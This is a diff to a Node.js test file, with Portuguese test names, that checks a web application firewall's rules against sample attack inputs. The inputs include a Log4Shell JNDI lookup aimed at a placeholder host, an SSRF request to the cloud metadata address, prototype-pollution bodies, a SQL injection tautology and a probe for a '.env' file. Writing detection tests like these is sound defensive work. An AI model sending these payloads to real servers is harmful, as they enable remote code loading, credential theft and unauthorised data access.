@@ -3,7 +3,7 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 const { Waf } = require('../waf.cjs');
 
-const waf = new Waf(require('../waf-rules.json'));
+const waf = new Waf(require('../waf-rules.json'), { paranoia: 2 });
 const ids = result => result.events.map(event => event.rule.id);
 
 test('carrega o conjunto inteiro de regras', () => {
@@ -44,6 +44,23 @@ test('prevenção de exploit compara a operação com a entrada', () => {
   const sql = waf.createContext();
   sql.run({ persistent: { 'server.request.query': { id: ["1' OR '1'='1"] } } }, 200000);
   assert.ok(ids(sql.run({ ephemeral: { 'server.db.statement': "SELECT * FROM t WHERE id = '1' OR '1'='1'", 'server.db.system': 'mysql' } }, 200000)).includes('rasp-942-100'));
+});
+
+test('regras próprias: Log4Shell, SSRF a metadados e poluição de protótipo', () => {
+  const run = persistent => ids(waf.createContext().run({ persistent }, 500000));
+  assert.ok(run({ 'server.request.headers.no_cookies': { 'x-api': '${jndi:ldap://x.example/a}' } }).includes('tlv-000-111'));
+  assert.ok(run({ 'server.request.query': { u: ['http://169.254.169.254/latest/meta-data/'] } }).includes('tlv-000-101'));
+  assert.ok(run({ 'server.request.body': JSON.parse('{"__proto__":{"admin":true}}') }).includes('tlv-000-004'));
+  assert.ok(run({ 'server.request.query': { 'a[constructor][prototype][x]': ['1'] } }).includes('tlv-000-005'));
+});
+
+test('varredura só dispara quando a resposta é 404', () => {
+  const miss = waf.createContext();
+  miss.run({ persistent: { 'server.request.path': '/.env' } }, 200000);
+  assert.ok(ids(miss.run({ persistent: { 'server.response.status': '404' } }, 200000)).includes('tlv-000-206'));
+  const hit = waf.createContext();
+  hit.run({ persistent: { 'server.request.path': '/.env' } }, 200000);
+  assert.deepEqual(ids(hit.run({ persistent: { 'server.response.status': '200' } }, 200000)), []);
 });
 
 test('esquema da API marca campos sensíveis sem valores', () => {
